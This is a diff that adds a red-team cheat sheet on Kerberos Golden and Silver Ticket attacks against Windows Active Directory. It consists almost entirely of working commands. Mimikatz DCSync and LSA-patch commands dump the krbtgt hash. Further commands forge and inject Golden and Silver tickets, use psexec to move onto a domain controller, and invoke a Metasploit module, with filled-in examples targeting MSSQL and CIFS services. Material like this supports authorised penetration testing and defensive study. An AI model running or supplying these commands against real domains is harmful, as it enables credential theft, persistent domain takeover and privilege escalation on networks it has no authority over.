@@ -1,0 +1,48 @@
+# Kerberos Tickets
+# https://morph3sec.com/Cheat-Sheets/Windows-Red-Team-Cheat-Sheet/
+# Golden and Silver Tickets
+Keys depend of ticket :
+–> for a Golden, they are from the krbtgt account;
+–> for a Silver, it comes from the “computer account” or “service account”.
+
+# Golden Ticket
+
+## Extract the hash of the krbtgt user
+lsadump::dcsync /domain:evil.corp /user:krbtgt
+lsadump::lsa /inject
+lsadump:::lsa /patch
+lsadump::trust /patch
+
+## creating the ticket 
+;; /rc4 or /krbtgt - the NTLM hash
+;; /sid you will get this from krbtgt dump
+;; /ticket parameter is optional but default is ticket.kirbi
+;; /groups parameter is optional but default is 513,512,520,518,519
+;; /id you can fake users and supply valid Administrator id 
+kerberos::golden /user:morph3 /domain:evil.corp /sid:domains-sid /krbtgt:krbtgt-hash /ticket:ticket.kirbi /groups:501,502,513,512,520,518,519 
+kerberos::ptt golden.tck # you can also add /ptt at the kerberos::golden command
+
+;;After this , final ticket must be ready
+;;You can now verify that your ticket is in your cache 
+powershell.exe -c "klist"
+
+## Verify that golden ticket is working
+dir \\DC\C$
+psexec.exe \\DC cmd.exe
+
+## Purge the currently cached kerberos ticket
+kerberos::purge 
+#metasploit module can also be used for golden ticket, it loads the ticket into given session
+post/windows/escalate/golden_ticket 
+
+# Silver Ticket
+;;Silver Ticket allows escalation of privileges on DC
+;;/target t he server/computer name where the service is hosted (ex: share.server.local, sql.server.local:1433, ...)
+;;/service - The service name for the ticket (ex: cifs, rpcss, http, mssql, ...)
+
+# Examples
+kerberos::golden /user:morph3 /domain:domain /sid:domain-sid /target:evilcorp-sql102.evilcorp.local.1433 /service:MSSQLSvc /rc4:service-hash /ptt /id:1103
+sqlcmd -S evilcorp-sql102.evilcorp.local
+select SYSTEM_USER;
+GO
+kerberos::golden /user:JohnDoe /id:500 /domain:targetdomain.com /sid:S-1-5-21-1234567890-123456789-1234567890 /target:targetserver.targetdomain.com /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt
